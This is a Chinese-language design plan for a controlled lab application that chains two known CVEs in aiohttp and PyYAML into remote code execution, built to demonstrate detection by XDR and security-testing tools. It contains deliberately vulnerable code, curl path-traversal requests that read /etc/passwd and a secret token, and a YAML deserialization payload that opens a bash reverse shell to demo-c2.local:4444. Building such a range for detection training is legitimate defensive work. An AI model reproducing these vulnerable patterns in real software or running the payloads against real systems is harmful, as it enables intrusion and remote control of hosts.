# Demo Application 实现方案：Python Web App 双 CVE 依赖攻击链

## Context

本项目是一个**受控靶场（lab）Demo 应用**，用于演示：

1. 开源依赖中已知 CVE 如何被串联利用
2. AI 安全测试工具（如 Strix）如何通过依赖分析 + 动态验证发现风险
3. XDR 如何在主机侧检测漏洞利用后形成的完整异常行为链

源 PDF 方案位于 `/Users/leon/customer-support-portal/Demo Application 方案：Python Web App 双 CVE 依赖攻击链.pdf`。本文档是该方案落地为可运行代码的实现计划。

**项目定位**：受控演示靶场，**不是**生产可部署的真实业务系统。所有"攻击效果"为受控行为，固定目的地址、固定 payload、不接受任意远程命令。

**与 PDF 方案的偏差点**（已与用户对齐）：

- PyYAML 版本从原方案 5.1 调整为 **5.3.1**——5.1 在 Python 3.10 下无法编译。改用 PyYAML 5.3.1 + 显式 `Loader=yaml.Loader` 写法保持 RCE 可达，SCA 工具仍能匹配 CVE-2020-14343 (PyYAML < 5.4)。
- C2 演示**保留真实反弹 shell**（用户明确要求"演示更直接"），但保留 lab 标识：固定监听地址 `demo-c2.local:4444`、Python TCP listener 仅做接收端、所有产物加 `lab-demo` 标记，避免被误用为真实攻击工具。

## 目标环境

- Python **3.10.20**（用户 venv 已存在 `/Users/leon/customer-support-portal/.venv`）
- 依赖锁定版本：`aiohttp==3.9.1`, `PyYAML==5.3.1`, `aiohttp-jinja2`, `jinja2`
- 部署目标：单台 Linux VM（systemd）+ 第二台 VM/容器作为 demo C2

## CVE 详情

| CVE | 库 | 版本 | 触发点 |
|---|---|---|---|
| CVE-2024-23334 | aiohttp 3.9.1 | < 3.9.2 | `add_static('/static/', dir, follow_symlinks=False)` 配置下，URL 路径中可用 `..` 穿越目录读取任意文件 |
| CVE-2020-14343 | PyYAML 5.3.1 | < 5.4 | `yaml.load(stream, Loader=yaml.Loader)` 反序列化 `!!python/object/apply` 标签 → RCE |

## 系统架构

```
┌─────────────────────────────────┐         ┌──────────────────────────┐
│ VM-1: support-portal-vm         │         │ VM-2: demo-c2-vm         │
│ ──────────────────────────────  │         │ ───────────────────────  │
│ aiohttp app (port 8080)         │ bash -i │ Python TCP listener      │
│  ├ GET  /                       │ ──────► │  on 0.0.0.0:4444         │
│  ├ GET  /admin                  │ reverse │  (接收交互 shell)         │
│  ├ POST /support/upload         │  shell  │                          │
│  ├ GET  /support/report/{id}    │         │                          │
│  ├ POST /internal/app-owner/    │         │                          │
│  │       profile/upload         │         │                          │
│  ├ GET  /static/* (CVE!)        │         │                          │
│  ├ DiagnosticEngine             │         │                          │
│  │   yaml.load(Loader=Loader)   │         │                          │
│  └ files in /opt/support-portal/│         │                          │
│ XDR agent on host               │         │                          │
└─────────────────────────────────┘         └──────────────────────────┘
```

文件布局（按 PDF §4.3）：

```
/opt/support-portal/
  config/app_config.yaml              # 含 internal route 路径与 token 文件路径
  secrets/profile-upload-token        # 单行 bearer token
  profiles/active.yaml                # 当前 active 诊断 profile (会被 PyYAML 加载)
  static/                             # aiohttp add_static 暴露目录
    logo.png
    index.html                        # 仅测试用静态资源
  uploads/<ticket_id>.zip             # 客户上传的 support-bundle
  reports/<ticket_id>.json            # 生成的诊断报告
```

## 仓库结构

```
customer-support-portal/
├── README.md                          # 项目定位 + 快速跑通指引 + 风险声明
├── DESIGN.md                          # 本方案副本（plan 批准后从 plan 文件复制）
├── requirements.txt                   # aiohttp==3.9.1, PyYAML==5.3.1, aiohttp-jinja2, jinja2
├── pyproject.toml                     # 最小 setuptools 配置（src layout）
│
├── src/support_portal/
│   ├── __init__.py
│   ├── __main__.py                    # python -m support_portal
│   ├── app.py                         # aiohttp Application 工厂 + 路由 + jinja2 setup
│   ├── config.py                      # 加载 app_config.yaml（safe_load）
│   ├── handlers/
│   │   ├── __init__.py
│   │   ├── pages.py                   # GET /, GET /admin, GET /support/report/{id}
│   │   ├── support.py                 # POST /support/upload
│   │   └── internal.py                # POST /internal/app-owner/profile/upload (token)
│   ├── diagnostic_engine.py           # ★ yaml.load(Loader=yaml.Loader) 漏洞点
│   ├── static_files.py                # ★ add_static 注册（CVE 触发点）
│   ├── templates/
│   │   ├── base.html
│   │   ├── index.html                 # 客户视图
│   │   ├── admin.html                 # App Owner 视图
│   │   └── report.html
│   └── static_assets/                 # UI 用 CSS/JS（与 CVE 目录隔离）
│       └── style.css
│
├── deploy/
│   ├── opt/support-portal/            # 镜像目录，install.sh rsync 到 /opt/...
│   │   ├── config/app_config.yaml
│   │   ├── secrets/profile-upload-token
│   │   ├── profiles/active.yaml
│   │   ├── static/
│   │   │   ├── logo.png
│   │   │   └── index.html
│   │   ├── uploads/.gitkeep
│   │   └── reports/.gitkeep
│   ├── systemd/support-portal.service
│   └── install.sh
│
├── demo_c2/
│   ├── listener.py                    # 单文件 Python TCP listener (4444)
│   ├── systemd/demo-c2.service
│   └── README.md
│
├── attack/                            # 红队侧演示脚本
│   ├── README.md                      # 12 步 walkthrough
│   ├── 01-fingerprint.sh
│   ├── 02-traversal-config.sh
│   ├── 03-traversal-token.sh
│   ├── 04-upload-evil-profile.sh
│   ├── 05-trigger.sh
│   ├── evil-profile.yaml              # !!python/object/apply payload
│   └── benign-bundle.zip              # 含 agent.log/system.log 的样例
│
└── tests/
    ├── conftest.py
    ├── test_diagnostic_engine.py
    ├── test_handlers.py
    └── test_attack_chain.py           # 端到端：用 127.0.0.1 mock listener
```

## 业务数据流（正常路径）

```
客户 → POST /support/upload (multipart, support-bundle.zip)
  ↓ 保存到 /opt/support-portal/uploads/<ticket_id>.zip
  ↓ DiagnosticEngine.analyze(zip_path):
       ├ 解压到临时目录
       ├ ★ yaml.load(open('/opt/support-portal/profiles/active.yaml'),
       │            Loader=yaml.Loader)   # CVE-2020-14343
       ├ 按 profile.rules 扫日志（contains 字符串匹配）
       └ 写 /opt/support-portal/reports/<ticket_id>.json
  ↓ 返回 {"ticket_id": "..."}

客户 → GET /support/report/{ticket_id}     → 渲染 report.html

App Owner → POST /internal/app-owner/profile/upload
            (Bearer <profile-upload-token> + YAML body)
  ↓ 校验 Authorization header == 文件内容
  ↓ 写入 /opt/support-portal/profiles/active.yaml （覆盖）
```

设计要点：`yaml.load` 调用点放在每次 `/support/upload` 时，使得攻击者上传恶意 profile 后**只需再发一次普通 support-bundle 即可触发** RCE——攻击链分"投递 → 触发"两阶段，符合 PDF 设计。

## 攻击链 12 步

| # | 攻击者动作 | XDR / 主机侧观察 |
|---|---|---|
| 1 | `nmap -p 8080 target` | 外部 TCP scan |
| 2 | `curl http://target:8080/` → Server: aiohttp/3.9.1 | HTTP recon |
| 3 | `curl 'http://target:8080/static/../../etc/passwd'` 探测穿越 | aiohttp 进程读异常路径 |
| 4 | `curl 'http://target:8080/static/../config/app_config.yaml'` | 读 /opt/support-portal/config/* |
| 5 | 解析 yaml → 看到 `internal_routes.diagnostic_profile_upload` 与 token 文件路径 | （客户端，不可见） |
| 6 | `curl 'http://target:8080/static/../secrets/profile-upload-token'` | aiohttp 进程读 secrets/* ⚠ |
| 7 | `curl -X POST .../internal/app-owner/profile/upload -H 'Authorization: Bearer <token>' --data-binary @evil-profile.yaml` | 内部接口被外部 IP 调用 |
| 8 | evil-profile.yaml 被写入 `/opt/support-portal/profiles/active.yaml` | profile 文件被覆盖 |
| 9 | 攻击者再发一次 `POST /support/upload` 触发 yaml.load | DiagnosticEngine 加载 profile |
| 10 | yaml.load 反序列化 `!!python/object/apply` 标签触发命令执行 | python → bash 子进程 spawn ⚠ |
| 11 | bash 反向 socket 连到 demo-c2.local:4444 | 异常外连 ⚠ |
| 12 | C2 收到交互 shell，输入 id/whoami 返回响应 | XDR 关联 1+3+4+6+7+10+11 → 攻击链告警 |

evil-profile.yaml payload 形态（由 PyYAML CVE-2020-14343 触发执行）：

```yaml
!!python/object/apply:os.system
- "bash -i >& /dev/tcp/demo-c2.local/4444 0>&1"
```

## UI 设计

技术：aiohttp-jinja2 + 模板继承。两个角色页面：

**`GET /` 客户视图**

- 顶部红色横条：`⚠ Lab Demo — 含已知 CVE 的受控靶场，请勿生产部署`
- 业务说明（3 行）
- 上传 `support-bundle.zip` 表单 → POST `/support/upload`
- 查询 ticket_id → 跳 `/support/report/{id}`
- 角色说明卡片（呼应 PDF §3 角色分工表），列出"App Owner 上传 profile"但**不显示** `/admin` 路径

**`GET /admin` App Owner 视图**

- 顶部一行：`⚠ Internal use only — protected by profile-upload-token`
- 当前 active profile 内容预览（YAML 文本框，只读）
- token 输入框 + profile YAML 文本框 → POST `/internal/app-owner/profile/upload`
- 上传成功/失败提示

**`GET /support/report/{ticket_id}`**

- 渲染 JSON 报告为 HTML 表（rules matched / severity / recommended_actions），同时支持 `Accept: application/json` 返回原始 JSON。

UI 模板和 CSS 放 `src/support_portal/templates/` 与 `static_assets/`，与 `add_static` 暴露的 `/opt/support-portal/static/`（CVE 目录）**完全隔离**——UI 改动不影响 CVE 触发点。

## 关键代码片段（实现时参考）

`src/support_portal/diagnostic_engine.py` 漏洞点：

```python
import yaml

def load_active_profile(profile_path: str) -> dict:
    with open(profile_path) as f:
        # CVE-2020-14343: 显式使用 yaml.Loader 允许任意 Python 对象反序列化
        return yaml.load(f, Loader=yaml.Loader)
```

`src/support_portal/static_files.py` CVE 配置：

```python
def setup_static(app, static_dir: str) -> None:
    # CVE-2024-23334: aiohttp 3.9.1 下 add_static 存在目录穿越
    app.router.add_static('/static/', static_dir, follow_symlinks=False)
```

`src/support_portal/handlers/internal.py` token 校验：

```python
async def upload_profile(request):
    token = request.app['config']['secrets']['profile_upload_token_value']
    auth = request.headers.get('Authorization', '')
    if auth != f'Bearer {token}':
        return web.Response(status=401, text='Unauthorized')
    body = await request.read()
    Path('/opt/support-portal/profiles/active.yaml').write_bytes(body)
    return web.json_response({'status': 'ok'})
```

`demo_c2/listener.py`（约 30 行）：单文件 Python TCP listener 在 4444 端口接收连接、把本地 stdin 转发给客户端、把客户端输出打印到本地。仅做接收端，无任何分发/泛化能力。

## 实现步骤（推荐顺序）

1. **复制方案到项目目录**：把本 plan 文件内容复制到 `/Users/leon/customer-support-portal/DESIGN.md`（用户明确要求）。
2. 创建 `requirements.txt` 并 `pip install -r requirements.txt`，验证 aiohttp 3.9.1 + PyYAML 5.3.1 在 Python 3.10.20 下成功安装。
3. 建立 src layout + `pyproject.toml`，使 `python -m support_portal` 可启动。
4. 实现 `app_config.yaml` + `config.py`（safe_load），定义路径与 token 配置。
5. 实现 `static_files.py` + `add_static` 注册，写一个最小 handler 让服务起来。
6. 实现 `diagnostic_engine.py`：解压 zip + 不安全 yaml.load + 规则匹配 + JSON 报告生成。
7. 实现 handlers：`pages.py`（jinja2 渲染 3 个页面）、`support.py`（upload）、`internal.py`（token 校验 + profile 写入）。
8. 写 `templates/*.html` + `static_assets/style.css`。
9. 创建 `deploy/opt/support-portal/` 内容（默认 active.yaml、token、app_config.yaml、合法 static 资源）。
10. 写 `deploy/install.sh` + `deploy/systemd/support-portal.service`，能在 Linux VM 上一键部署。
11. 写 `demo_c2/listener.py` + systemd unit，能在第二台 VM/容器上接收反弹 shell。
12. 写 `attack/` 下 5 个 shell 脚本 + `evil-profile.yaml` + `benign-bundle.zip`（含 `agent.log` / `system.log` 样本）。
13. 写测试：
    - `test_diagnostic_engine.py`：良性 profile 解析正确、zip 扫描产生预期 matched_rules
    - `test_handlers.py`：UI 三页渲染 200、token 校验 401/200、上传流程 ticket_id 返回
    - `test_attack_chain.py`：端到端用 127.0.0.1 上的 mock listener 验证 RCE 触发
14. 写 `README.md`：定位声明 + 快速本地起服务 + 部署说明 + 攻击 walkthrough + XDR 检测点清单。

## 验证方法

**本地单元/集成测试**：

```bash
cd /Users/leon/customer-support-portal
source .venv/bin/activate
pip install -r requirements.txt
pytest tests/ -v
```

期望：所有用例通过；`test_attack_chain.py` 验证 PyYAML payload 实际触发并连到 mock listener。

**本地手动验证（无 C2 VM 时）**：

```bash
# Terminal A: 启动 support-portal
python -m support_portal

# Terminal B: 启动一个 nc 模拟 c2
nc -lvnp 4444

# Terminal C: 跑攻击脚本，把 demo-c2.local 改成 127.0.0.1
cd attack/
./01-fingerprint.sh target=localhost
./02-traversal-config.sh target=localhost
./03-traversal-token.sh target=localhost
./04-upload-evil-profile.sh target=localhost token=demo-profile-admin-token-2026
./05-trigger.sh target=localhost
# Terminal A 的进程会 spawn bash -i 连到 Terminal B 的 nc
```

**完整 VM 演示**：

```bash
# VM-2 (demo-c2):
sudo bash demo_c2/install.sh && sudo systemctl start demo-c2

# VM-1 (support-portal):
sudo bash deploy/install.sh && sudo systemctl start support-portal
curl http://localhost:8080/   # 应返回 200 + 含 lab-demo 警告

# 攻击者机器：cd attack/ && ./01..05-*.sh
# VM-2 demo-c2 控制台收到 shell，输入 id / whoami 看响应
```

**XDR 验证点（依赖外部 XDR，不在代码范围）**：

PDF §8 列出的 9 个检测点，本实现保证以下行为可在主机侧观察到：

1. 外部源对 8080 的扫描和 `/static/../*` 异常路径访问
2. aiohttp 进程读 `/opt/support-portal/config/*` 与 `secrets/*`
3. `/internal/app-owner/profile/upload` 被外部 IP 调用
4. `profiles/active.yaml` 被覆盖写入
5. python → bash 子进程 spawn（PyYAML 反序列化触发）
6. bash 进程外连 `demo-c2.local:4444`
7. 多事件被关联为一条攻击链

## YAGNI / 不做的事

- 不做用户登录、会话、数据库（最小可演示）
- 不做 SQLite ticket 持久化（reports/ 用文件即可）
- 不做支持工程师视图（仅客户 + App Owner 两页）
- 不写 OS 层提权 / LPE 演示（PDF §10 明确建议先不加）
- 不引入 docker-compose（用户选 systemd VM 部署）
- 不为 Strix 输入特意打磨 README（用户表示先不关心）
